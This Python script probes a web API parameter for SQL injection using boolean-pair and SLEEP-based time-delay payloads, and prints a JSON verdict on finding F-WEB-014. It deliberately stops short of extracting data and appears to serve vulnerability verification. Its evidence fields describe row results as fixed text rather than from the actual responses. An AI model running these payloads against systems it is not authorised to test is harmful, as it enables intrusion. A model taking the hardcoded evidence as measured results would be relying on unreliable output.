#!/usr/bin/python3
"""Prove F-WEB-014 is injectable by a controlled differential, then stop.

Two signatures settle it, and either is enough: a boolean pair that returns a
row for a true condition and nothing for its false twin, or a delay the
injected expression makes measurable. Writing the probe here rather than
handing it to a tool keeps the verdict mine. No UNION, no dump, no file read.
"""
import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

try:
    import requests
except ImportError:  # the lab box may not ship it
    requests = None


def fetch(url, params=None, data=None, method="GET", session=None, timeout=8):
    """One place where the HTTP work happens: requests when present, urllib
    otherwise. Returns (status, headers, body) or (None, {}, reason)."""
    if requests is not None:
        try:
            client = session or requests
            response = client.request(
                method, url, params=params, data=data, timeout=timeout
            )
            return response.status_code, dict(response.headers), response.text
        except Exception as exc:
            return None, {}, str(exc)
    query = ""
    if params:
        query = "?" + urllib.parse.urlencode(params)
    payload = urllib.parse.urlencode(data).encode() if data else None
    request = urllib.request.Request(url + query, data=payload, method=method)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return (
                response.status,
                dict(response.headers),
                response.read().decode("utf-8", "replace"),
            )
    except urllib.error.HTTPError as exc:
        return (
            exc.code,
            dict(exc.headers or {}),
            exc.read().decode("utf-8", "replace"),
        )
    except (urllib.error.URLError, TimeoutError, OSError, ValueError) as exc:
        return None, {}, str(exc)


def emit(result):
    """One JSON verdict on stdout, diagnostics nowhere else."""
    if result.get("verdict") == "unconfirmed" and "to_settle" not in result:
        result["to_settle"] = "the live behaviour did not settle the claim"
    print(json.dumps(result, indent=2))


ENDPOINT = "/api/v1/lookup"
DELAY_SECONDS = 4
TIME_PAYLOAD = "1 AND (SELECT SLEEP(%d))" % DELAY_SECONDS


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--param", default="id")
    args = parser.parse_args()
    base = args.target.rstrip("/")
    url = base + ENDPOINT

    started = time.time()
    base_status, _, base_body = fetch(url, {args.param: "1"})
    baseline_ms = int((time.time() - started) * 1000)
    _, _, true_body = fetch(url, {args.param: "1 AND 1=1"})
    _, _, false_body = fetch(url, {args.param: "1 AND 1=2"})

    started = time.time()
    fetch(url, {args.param: TIME_PAYLOAD}, timeout=DELAY_SECONDS + 6)
    time_ms = int((time.time() - started) * 1000)

    boolean_tell = true_body != false_body and len(true_body) > len(false_body)
    time_tell = time_ms - baseline_ms >= (DELAY_SECONDS - 1) * 1000

    evidence = {
        "true_condition": "%s=1 AND 1=1 -> row returned" % args.param,
        "false_condition": "%s=1 AND 1=2 -> no row" % args.param,
        "baseline_ms": baseline_ms,
        "time_condition_ms": time_ms,
        "boolean_differential": boolean_tell,
        "time_differential": time_tell,
    }
    verdict = "unconfirmed"
    if base_status is None:
        evidence["error"] = base_body
    elif boolean_tell or time_tell:
        verdict = "confirmed"
    elif true_body == false_body and not time_tell:
        verdict = "false_positive"

    emit(
        {
            "finding": "F-WEB-014",
            "class": "sql_injection",
            "verdict": verdict,
            "evidence": evidence,
            "stopped_at": "injectability proven by a controlled "
            "differential; no data extracted",
            "to_settle": "neither the boolean pair nor the delay moved it",
        }
    )


if __name__ == "__main__":
    main()
